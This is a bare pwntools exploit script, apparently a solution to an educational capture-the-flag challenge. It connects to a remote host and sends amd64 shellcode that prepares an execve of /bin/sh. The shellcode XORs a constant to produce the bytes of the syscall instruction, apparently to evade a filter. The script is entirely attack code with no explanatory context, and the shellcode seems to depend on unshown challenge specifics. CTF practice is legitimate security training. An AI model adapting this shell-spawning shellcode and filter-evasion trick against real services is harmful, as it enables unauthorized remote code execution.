from pwn import *
context.arch = 'amd64'

r = remote('edu-ctf.csie.org', 10150)
shellcode = asm('''
        mov    rdi, 0x68732f6e69622f     
        xor    rsi, rsi 
        xor    rdx, rdx 
        mov    rax, 0x3b
        mov    rbx, 0xf0fa
        xor    rbx, 0xffff
        mov    rsp, rbx
''')

r.sendlineafter('>', shellcode)
